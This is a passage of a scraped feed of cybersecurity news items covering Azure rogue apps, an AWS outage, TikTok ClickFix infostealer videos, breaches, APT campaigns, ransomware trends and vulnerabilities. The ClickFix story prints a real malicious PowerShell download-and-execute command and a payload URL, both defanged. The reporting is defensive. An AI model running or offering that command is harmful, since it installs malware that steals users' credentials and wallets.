more prevalent than we anticipated. Some of these apps had been around for years by the time we uncovered them.\nAnd if you take anything from this article, let it be this: statistically speaking, there’s a good chance that your own tenant is infected with one of these apps.\nIntroducing: Cazadora\nIf you’ve made it this far and are now thinking “wow, maybe I should go audit my apps,” great! That means that I’ve sufficiently demonstrated how much attack potential exists in the Azure app ecosystem.\nTo speed up the process of educating the community and giving Azure admins a fighting chance to clear out the termite nests, I built and released an open source tool that enumerates your tenant’s apps and hunts through them to find any smoking guns.\nIntroducing: Cazadora, a dead-simple Azure app hunting script. Huntress partner or otherwise, anyone can run this script to enumerate and audit your tenant apps against a set of commonly observed tradecraft attributes.\nIt uses your own user authentication, calls the Graph API, wrangles the data from the API about your tenant’s Enterprise Applications and App Registrations, and runs some hunting logic against the results.\nIt’s quick and rough around the edges, but the idea here is to empower Azure admins everywhere to get an immediate idea about any smoking gun apps in their tenant.\nThe script can’t find 100% of evil apps everywhere, of course. And even if the script doesn’t find anything, that does not mean your tenant is safe from malicious apps. But at the very least, it’s a great jump off point for Azure admins to audit their apps and identify anything glaring.\nPlease see the README in the repo for instructions! Give it a shot. See what you find, or…\nAbuse our ITDR Assessment\nStatistically, there’s a good chance we’ll find something. The Huntress Identity Security Assessment provides a clear snapshot of your Microsoft 365 Identity Threat landscape—highlighting license types, rogue apps, suspicious logins, and malicious inbox rules.\nIf no threats are found, you’ll still gain valuable insights into the key areas we monitor and the threats we hunt for.\nWorst case? We uncover risks. Best case? You know you’re secure. Either way, you walk away informed and empowered. Check it out.\nMaintain Situational Awareness—Register for Tradecraft Tuesday\nTradecraft Tuesday provides cybersecurity professionals with an in-depth analysis of the latest threat actors, attack vectors, and mitigation strategies.\nEach weekly session features technical walkthroughs of recent incidents, comprehensive breakdowns of malware trends, and up-to-date indicators of compromise (IOCs).\nParticipants gain:\n-\nDetailed briefings on emerging threat campaigns and ransomware variants\n-\nEvidence-driven defense methodologies and remediation techniques\n-\nDirect interaction with Huntress analysts for incident response insights\n-\nAccess to actionable threat intelligence and detection guidance\nAdvance your defensive posture with real-time intelligence and technical education specifically designed for those responsible for safeguarding their organization’s environment.\nRegister for Tradecraft Tuesday →\nSponsored and written by Huntress Labs.", "timestamp": "2025-10-21T13:35:42.060581"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "AWS outage crashes Amazon, Prime Video, Fortnite, Perplexity and more", "url": "https://www.bleepingcomputer.com/news/technology/aws-outage-crashes-amazon-prime-video-fortnite-perplexity-and-more/", "published": "Mon, 20 Oct 2025 04:24:25 -0400", "content": "AWS outage has taken down millions of websites, including Amazon.com, Prime Video, Perplexity AI, Canva and more.\nThe outage started approx 30 minutes ago and it's affecting consumers in all regions, including the United States and Europe.\nAccording to AWS Health page, Amazon is aware of major disruption affecting multiple services.\n\"We can confirm increased error rates and latencies for multiple AWS Services in the US-EAST-1 Region. This issue may also be affecting Case Creation through the AWS Support Center or the Support API. We are actively engaged and working to both mitigate the issue and understand root cause,\" AWS noted.\n\"We are investigating increased error rates and latencies for multiple AWS services in the US-EAST-1 Region.\"\nWhile Amazon has not shared the specific cause of the outage, the status updates indicate that it is related to a DNS resolution issue for the DynamoDB API endpoint in the US-EAST-1 AWS region.\nFortnite, Perplexity, Canva and others confirm service disruption\nIn a post on X, Epic Games' Fornite confirmed a major service disruption. While Fornite gameplay itself is not affected, you won't be able to log-in, as the login is powered by AWS.\nPerplexity also confirmed its chat app is offline due to AWS outage.\nGraphic design company Canva acknowledgd service outage impacting image editing and other features.\n\"We are currently experiencing significantly increased error rates which are impacting functionality on Canva. Our team is actively investigating the issue and working to restore full access as quickly as possible,\" Canva noted on its status page.\nAccording to Downdetector, 15 major services, including enertainment platforms like Roblox and Hulu, are offline due to AWS issues.\nList of major services affected by AWS outage:\n- Amazon\n- Prime Video\n- Fortnite\n- Canvas\n- Clash of Clans\n- Clash of Royals\n- Palworld\n- Snapchat\n- Perplexity\n- Canva\n- Roblox\n- Hulu\n- Robinhood\n- Grammarly\nUpdate 10/20/25 5:00 AM EDT: Some services are recovering after 45 minutes of outage\nUpdate 10/20/25 5:25 AM EDT: AWS says the services are now fully restored.\nUpdate 10/20/25 12:06 PM EDT: While AWS says they have mitigated the DNS issue, they are now saying they are having issues with its network load balancers, which continue to cause widespread outages for companies utilizing the cloud platform.\n\"We have taken additional mitigation steps to aid the recovery of the underlying internal subsystem responsible for monitoring the health of our network load balancers and are now seeing connectivity and API recovery for AWS services,\" reads AWS' status page.\n\"We have also identified and are applying next steps to mitigate throttling of new EC2 instance launches. We will provide an update by 10:00 AM PDT.\"\nMany online services, including Canvas, which is widely used by schools in the US, continue to show outage messages when users attempt to log in to the platform.\nBleepingComputer contacted Amazon with questions about what is causing the outage and will update the article if we receive a response.\nThis is a developing story.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:42.870088"}
{"source": "blog", "feed": "https://www.bleepingcomputer.com/feed/", "title": "TikTok videos continue to push infostealers in ClickFix attacks", "url": "https://www.bleepingcomputer.com/news/security/tiktok-videos-continue-to-push-infostealers-in-clickfix-attacks/", "published": "Sun, 19 Oct 2025 14:28:25 -0400", "content": "Cybercriminals are using TikTok videos disguised as free activation guides for popular software like Windows, Spotify, and Netflix to spread information-stealing malware.\nISC Handler Xavier Mertens spotted the ongoing campaign, which is largely the same as the one observed by Trend Micro in May\nThe TikTok videos seen by BleepingComputer pretend to offer instructions on how to activate legitimate products like Windows, Microsoft 365, Adobe Premiere, Photoshop, CapCut Pro, and Discord Nitro, as well as made-up services such as Netflix and Spotify Premium.\nThe videos are performing a ClickFix attack, which is a social engineering technique that provides what appears to be legitimate \"fixes\" or instructions that trick users into executing malicious PowerShell commands or other scripts that infect their computers with malware.\nEach video displays a short one-line command and tells viewers to run it as an administrator in PowerShell:\niex (irm slmgr[.]win/photoshop)\nIt should be noted that the program name in the URL is different depending on the program that is being impersonated. For example, in the fake Windows activation videos, instead of the URL containing photoshop, it would include windows.\nIn this campaign, when the command is executed, PowerShell connects to the remote site slmgr[.]win to retrieve and execute another PowerShell script.\nThis script downloads two executables from Cloudflare pages, with the first executable downloaded from https://file-epq[.]pages[.]dev/updater.exe [VirusTotal]. This executable is a variant of the Aura Stealer info-stealing malware.\nAura Stealer collects saved credentials from browsers, authentication cookies, cryptocurrency wallets, and credentials from other applications and uploads them to the attackers, giving them access to your accounts.\nMertens says that an additional payload will be downloaded, named source.exe [VirusTotal], which is used to self-compile code using .NET's built-in Visual C# Compiler (csc.exe). This code is then injected and launched in memory.\nThe purpose of the additional payload remains unclear.\nUsers who perform these steps should consider all of their credentials compromised and immediately reset their passwords on all sites they visit.\nClickFix attacks have become very popular over the past year, used to distribute various malware strains in ransomware and cryptocurrency theft campaigns.\nAs a general rule, users should never copy text from a website and run it in an operating system dialog box, including within the File Explorer address bar, command prompt, PowerShell prompts, macOS terminal, and Linux shells.\nPicus Blue Report 2025 is Here: 2X increase in password cracking\n46% of environments had passwords cracked, nearly doubling from 25% last year.\nGet the Picus Blue Report 2025 now for a comprehensive look at more findings on prevention, detection, and data exfiltration trends.", "timestamp": "2025-10-21T13:35:43.601919"}
{"source": "blog", "feed": "https://threatpost.com/feed/", "title": "Student Loan Breach Exposes 2.5M Records", "url": "https://threatpost.com/student-loan-breach-exposes-2-5m-records/180492/", "published": "Wed, 31 Aug 2022 12:57:48 +0000", "content": "EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.\nThe target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.\nNelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.\n“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.\nBy August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.\nAccording to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.\n“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website\nportal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.\nIt’s unclear what the vulnerability was.\n“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.\nLoan Recipient Targets\nAlthough users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.\n“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.\nLast week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.\nShe warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.\n“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.\nAccording to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”\nRemediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.", "timestamp": "2025-10-21T13:35:46.343709"}
{"source": "blog", "feed": "https://threatpost.com/feed/", "title": "Watering Hole Attacks Push ScanBox Keylogger", "url": "https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/", "published": "Tue, 30 Aug 2022 16:00:43 +0000", "content": "A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.\nThe cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.\nThe threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.\nThe APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.\nMSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.\nDusting Off the ScanBox\nThe campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.\nScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.\n“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.\nIn lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.\nTA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.\n“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.\nThe link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.\nScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.\nThe primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.\n“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.\nAdversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.\n“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.\n“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.\nThreat Actors\nThe threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”\nThe group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”\nDespite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”", "timestamp": "2025-10-21T13:35:47.149278"}
{"source": "blog", "feed": "https://threatpost.com/feed/", "title": "Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms", "url": "https://threatpost.com/0ktapus-victimize-130-firms/180487/", "published": "Mon, 29 Aug 2022 14:56:19 +0000", "content": "Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.\n“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”\nImpacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.\nRoberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.\nWhat the 0ktapus Hackers Wanted\nThe 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.\nWhile unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.\n“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.\nNext, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.\nIn an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.\nIn a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.\nBlast Radius: MFA Attacks\nIn a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.\nIn the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.\n“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.\n“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”\nTo mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.\n“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”", "timestamp": "2025-10-21T13:35:47.811363"}
{"source": "blog", "feed": "https://threatpost.com/feed/", "title": "Ransomware Attacks are on the Rise", "url": "https://threatpost.com/ransomware-attacks-are-on-the-rise/180481/", "published": "Fri, 26 Aug 2022 16:44:27 +0000", "content": "After a recent dip, ransomware attacks are back on the rise. According to data released by NCC Group, the resurgence is being led by old ransomware-as-a-service (RaaS) groups.\nWith data gathered by “actively monitoring the leak sites used by each ransomware group and scraping victim details as they are released,” researchers have determined that Lockbit was by far the most prolific ransomware gang in July, behind 62 attacks. That’s ten more than the month prior, and more than twice as many as the second and third most prolific groups combined. “Lockbit 3.0 maintain their foothold as the most threatening ransomware group,” the authors wrote, “and one with which all organizations should aim to be aware of.”\nThose second and third most prolific groups are Hiveleaks – 27 attacks – and BlackBasta – 24 attacks. These figures represent rapid rises for each group – since June, a 440 percent rise for Hiveleaks, and a 50 percent rise for BlackBasta.\nIt may well be that the resurgence in ransomware attacks, and the rise of these two particular groups, are intimately connected.\nWhy Ransomware Has Bounced\nResearchers from NCC Group counted 198 successful ransomware campaigns in July – up 47 percent from June. Sharp as that incline may be, it still falls some ways short of the high-water mark set this Spring, with nearly 300 such campaigns in both March and April.\nWhy the Flux?\nWell, in May, the United States government ramped up its efforts against Russian cybercrime by offering up to $15 million for prized information about Conti, then the world’s foremost ransomware gang. “It is likely that the threat actors that were undergoing structural changes,” the authors of the report speculated, “and have begun settling into their new modes of operating, resulting in their total compromises increasing in conjunction.”\nHiveleaks and BlackBasta are the result of that restructuring. Both groups are “associated with Conti,” the authors noted, Hiveleaks as an affiliate and BlackBasta as a replacement strain. “As such, it appears that it has not taken long for Conti’s presence to filter back into the threat landscape, albeit under a new identity.”\nNow that Conti’s properly split in two, the authors speculated, “it would not be surprising to see these figures further increase as we move into August.”", "timestamp": "2025-10-21T13:35:48.474906"}
{"source": "blog", "feed": "https://threatpost.com/feed/", "title": "Cybercriminals Are Selling Access to Chinese Surveillance Cameras", "url": "https://threatpost.com/cybercriminals-are-selling-access-to-chinese-surveillance-cameras/180478/", "published": "Thu, 25 Aug 2022 18:47:15 +0000", "content": "New research indicates that over 80,000 Hikvision surveillance cameras in the world today are vulnerable to an 11 month-old command injection flaw.\nHikvision – short for Hangzhou Hikvision Digital Technology – is a Chinese state-owned manufacturer of video surveillance equipment. Their customers span over 100 countries (including the United States, despite the FCC labeling Hikvision “an unacceptable risk to U.S. national security” in 2019).\nLast Fall, a command injection flaw in Hikvision cameras was revealed to the world as CVE-2021-36260. The exploit was given a “critical” 9.8 out of 10 rating by NIST.\nDespite the severity of the vulnerability, and nearly a year into this story, over 80,000 affected devices remain unpatched. In the time since, the researchers have discovered “multiple instances of hackers looking to collaborate on exploiting Hikvision cameras using the command injection vulnerability,” specifically in Russian dark web forums, where leaked credentials have been put up for sale.\nThe extent of the damage done already is unclear. The authors of the report could only speculate that “Chinese threat groups such as MISSION2025/APT41, APT10 and its affiliates, as well as unknown Russian threat actor groups could potentially exploit vulnerabilities in these devices to fulfill their motives (which may include specific geo-political considerations).”\nThe Risk in IoT Devices\nWith stories like this, it’s easy to ascribe laziness to individuals and organizations that leave their software unpatched. But the story isn’t always so simple.\nAccording to David Maynor, senior director of threat intelligence at Cybrary, Hikvision cameras have been vulnerable for many reasons, and for a while. “Their product contains easy to exploit systemic vulnerabilities or worse, uses default credentials. There is no good way to perform forensics or verify that an attacker has been excised. Furthermore, we have not observed any change in Hikvision’s posture to signal an increase in security within their development cycle.”\nA lot of the problem is endemic to the industry, not just Hikvision. “IoT devices like cameras aren’t always as easy or straightforward to secure as an app on your phone,” Paul Bischoff, privacy advocate with Comparitech, wrote in a statement via email. “Updates are not automatic; users need to manually download and install them, and many users might never get the message. Furthermore, IoT devices might not give users any indication that they’re unsecured or out of date. Whereas your phone will alert you when an update is available and likely install it automatically the next time you reboot, IoT devices do not offer such conveniences.”\nWhile users are none the wiser, cybercriminals can scan for their vulnerable devices with search engines like Shodan or Censys. The problem can certainly be compounded with laziness, as Bischoff noted, “by the fact that Hikvision cameras come with one of a few predetermined passwords out of the box, and many users don’t change these default passwords.”\nBetween weak security, insufficient visibility and oversight, it’s unclear when or if these tens of thousands of cameras will ever be secured.", "timestamp": "2025-10-21T13:35:49.141642"}
{"source": "blog", "feed": "https://threatpost.com/feed/", "title": "Twitter Whistleblower Complaint: The TL;DR Version", "url": "https://threatpost.com/twitter-whistleblower-tldr-version/180472/", "published": "Wed, 24 Aug 2022 14:17:04 +0000", "content": "A recently surfaced 84-page whistleblower report filed with the US government by Twitter’s former head of security Peiter “Mudge” Zatko last month blasts his former employer for its alleged shoddy security practices and being out of compliance with an FTC order to protect user data.\nTwitter has responded alleging that Zatko is a “disgruntled employee” who was fired for poor performance and leadership. In a letter to employees Twitter’s CEO Parag Agrawal asserts that Zatko’s claims are a “false narrative that is riddled with inconsistencies and inaccuracies, and presented without important context.”\nHere is an abbreviated overview of the allegations and Twitter’s reaction.\nAllegations\nZatko, a respected white-hat hacker who served as Twitter’s head of security for roughly 15 months between 2020 and 2022, accused Twitter of a litany of poor security and privacy practices that together constituted a national security risk.\nTop accusations include:\n- Twitter is a mismanaged company and gives too many of its staff access to sensitive security and privacy controls without adequate oversight.\n- One or more Twitter employees may be working for undisclosed foreign intelligence services. This, according to Zatko, elevates his concerns to a matter of national security.\n- Nearly half of Twitter’s servers lack basic security features, such as data encryption, because software running on them is either outdated or unpatched.\n- Twitter executives have prioritized growth over security as they have personally pursued massive bonuses, as high as $10 million, as incentives for the company’s rapid expansion.\n- The company is out of compliance with a 2010 FTC order to protect users’ personal information. Additionally, the company has lied to independent auditors of an FTC mandated “comprehensive information security program” tied to the 2010 order.\n- Twitter does not honor user requests to delete their personal data, because of technical limitations.\n- When Zatko attempted to bring these and many other security and privacy issues to Twitter’s board, company management misrepresented his finding and/or tried to hide the report.\n- Twitter allowed some foreign governments “… to infiltrate, control, exploit, surveil and/or censor the ‘company’s platform, staff, and operations,” according to the redacted whistleblower report submitted to congress.\n- Twitter does not have the resources or capacity to accurately determine the true number of fake (or bot) accounts on its platform. This question is central to a Elon Musk’s attempt to back out of buying the company for $44 billion.\nTwitter’s Muted Response\nThe thrust of Twitter’s response to Zatko is that he is a disgruntled employee, bad at his job and scapegoating Twitter for his failures. It points out that it has addressed and continues to aggressively address many of the IT security issues pointed out by Zatko.\nAn alleged response by Twitter’s CEO Parag Agrawal sent internally to Twitter employees was posted online.\nNEW: First time Twitter CEO @paraga weighs in on whistleblower story.\nSending this message to staff this morning. pic.twitter.com/WY4TCqbA5q\n— Donie O'Sullivan (@donie) August 23, 2022\nMeanwhile top Democrats and Republicans in Congress have reacted by promising to investigate the claims. Sen. Richard Durbin (D-IL), chair of the Senate Judiciary Committee, confirmed he was investigating the whistleblower disclosure.\nThe whistleblower’s allegations of widespread security failures at Twitter, willful misrepresentations by top executives to government agencies, and penetration of the company by foreign intelligence raise serious concerns. https://t.co/9QQtlDSogr\n— Senator Dick Durbin (@SenatorDurbin) August 23, 2022", "timestamp": "2025-10-21T13:35:49.946716"}
{"source": "blog", "feed": "https://threatpost.com/feed/", "title": "Firewall Bug Under Active Attack Triggers CISA Warning", "url": "https://threatpost.com/firewall-bug-under-active-attack-cisa-warning/180467/", "published": "Tue, 23 Aug 2022 13:19:58 +0000", "content": "Software running Palo Alto Networks’ firewalls is under attack, prompting U.S. Cybersecurity and Infrastructure Security Agency (CISA) to issue a warning to public and federal IT security teams to apply available fixes. Federal agencies urged to patch the bug by September 9.\nEarlier this month, Palo Alto Networks issued a fix for the high-severity bug (CVE-2022-0028) that it says adversaries attempted to exploit. The flaw could be used by remote hackers to carry out reflected and amplified denial-of-service (DoS) attacks without having to authenticate targeted systems.\nPalo Alto Networks maintains the flaw can only be exploited on a limited number of systems, under certain conditions and that the vulnerable systems are not part of a common firewall configuration. Any additional attacks exploiting the bug have either not occurred or been publicly reported.\nAffected Products and OS Versions\nAffected products include those running the PAN-OS firewall software include PA-Series, VM-Series and CN-Series devices. PAN-OS versions vulnerable to attack, with patches available, include PAN-OS prior to 10.2.2-h2, PAN-OS prior to 10.1.6-h6, PAN-OS prior to 10.0.11-h1, PAN-OS prior to 9.1.14-h4, PAN-OS prior to 9.0.16-h3 and PAN-OS prior to 8.1.23-h1.\nAccording to Palo Alto Networks advisory; “A PAN-OS URL filtering policy misconfiguration could allow a network-based attacker to conduct reflected and amplified TCP denial-of-service (RDoS) attacks. The DoS attack would appear to originate from a Palo Alto Networks PA-Series (hardware), VM-Series (virtual) and CN-Series (container) firewall against an attacker-specified target.”\nThe advisory describes the non-standard configuration at risk as the “firewall configuration must have a URL filtering profile with one or more blocked categories assigned to a security rule with a source zone that has an external facing network interface.”\nThe configuration is likely unintended by the network administrator, the advisory said.\nCISA Adds Bug to KEV Catalog\nOn Monday, CISA added the Palo Alto Networks bug to its list of Known Exploited Vulnerabilities Catalog.\nThe CISA Known Exploited Vulnerabilities (KEV) Catalog is a curated list of flaws that have been exploited in the wild. It is also a list of KEVs that the agency “strongly recommends” public and private organizations pay close attention to in order to “prioritize remediation” to “reduce the likelihood of compromise by known threat actors.”\nReflective and Amplification DoS Attacks\nOne of the most notable evolutions in the DDoS landscape is the growth in the peak size of volumetric attacks. Attackers continue to use reflection/amplification techniques to exploit vulnerabilities in DNS, NTP, SSDP, CLDAP, Chargen and other protocols to maximize the scale of their attacks.\nReflected and amplified denial-of-service attacks are not new and have steadily become more common over the years.\nDistributed denial of service attacks, bent on taking websites offline by overwhelming domains or specific application infrastructure with massive traffic flows, continue to pose a major challenge to businesses of all stripes. Being knocked offline impacts revenue, customer service and basic business functions – and worryingly, the bad actors behind these attacks are honing their approaches to become ever more successful over time.\nUnlike limited volume DDoS attacks, reflective and amplified DoS attacks can produce much higher volumes of disruptive traffic. This type of attack allows an adversary to magnify the amount of malicious traffic they generate while obscuring the sources of the attack traffic. An HTTP-based DDoS attack, for example, sends junk HTTP requests to a target’s server tying up resources and locking out users from using a particular site or service.\nA TCP attack, believed used in the recent Palo Alto Networks attack, is when an attacker sends a spoofed SYN packet, with the original source IP replaced by the victim’s IP address, to a range of random or pre-selected reflection IP addresses. The services at the reflection addresses reply with a SYN-ACK packet to the victim of the spoofed attack. If the victim does not respond, the reflection service will continue to retransmit the SYN-ACK packet, resulting in amplification. The amount of amplification depends on the number of SYN-ACK retransmits by the reflection service, which can be defined by the attacker.", "timestamp": "2025-10-21T13:35:50.743873"}
{"source": "blog", "feed": "https://threatpost.com/feed/", "title": "Fake Reservation Links Prey on Weary Travelers", "url": "https://threatpost.com/reservation-links-prey-on-travelers/180462/", "published": "Mon, 22 Aug 2022 13:59:06 +0000", "content": "A longtime threat group identified as TA558 has ramped up efforts to target the travel and hospitality industries. After a lull in activity, believed tied to COVID-related travel restrictions, the threat group has ramped up campaigns to exploit an uptick in travel and related airline and hotel bookings.\nWarnings come from security researchers who say TA558 cybercriminals have revamped their 2018 campaigns with fake reservation emails that contain links – that if clicked – deliver a malicious malware payload containing a potpourri of malware variants.\nWhat makes this most recent campaign unique, according to a report by Proofpoint, is the use of RAR and ISO file attachments linked to messages. ISO and RAR are single compressed files, that if executed, decompress the file and folder data inside of them.\n“TA558 began using URLs more frequently in 2022. TA558 conducted 27 campaigns with URLs in 2022, compared to just five campaigns total from 2018 through 2021. Typically, URLs led to container files such as ISOs or zip [RAR] files containing executables,” Proofpoint wrote.\nTo become infected, the targeted victim would have to be tricked into decompressing the file archive. “The reservation link… led to an ISO file and an embedded batch file. The execution of the BAT file led to a PowerShell helper script that downloaded a follow-on payload, AsyncRAT,” researchers wrote.\nUpgrade Your Itinerary To Malware Infection Status\nPast TA558 campaigns, tracked by Palo Alto Networks (in 2018), Cisco Talos (in 2020 and 2021) and Uptycs (in 2020), have leveraged malicious Microsoft Word document attachments (CVE-2017-11882) or remote template URLs to download and install malware, according to Proofpoint.\nThe shift to ISO and RAR files “is likely due to Microsoft’s announcements in late 2021 and early 2022 about disabling macros [VBA and XL4] by default in Office products,” researchers said.\n“In 2022, campaign tempo increased significantly. Campaigns delivered a mixture of malware such as, Loda, Revenge RAT, and AsyncRAT. This actor used a variety of delivery mechanisms including URLs, RAR attachments, ISO attachments, and Office documents,” researchers wrote.\nMalware payloads of recent campaigns typically include remote access trojans (RATs), that can enable reconnaissance, data theft and distribution of follow-on payloads, Proofpoint said.\nThrough all their evolutions, though, the goal of the group has always remained the same. The analysts concluded “with medium to high confidence” that TA558 is financially motivated, using stolen data to scale up and steal money. “Its possible compromises could impact both organizations in the travel industry as well as potentially customers who have used them for vacations,” Sherrod DeGrippo, vice president of threat research and detection organizations at Proofpoint, wrote in a statement. “Organizations in these and related industries should be aware of this actor’s activities and take precautions to protect themselves.”\nTA558’s History\nSince at least 2018, TA558 has primarily targeted 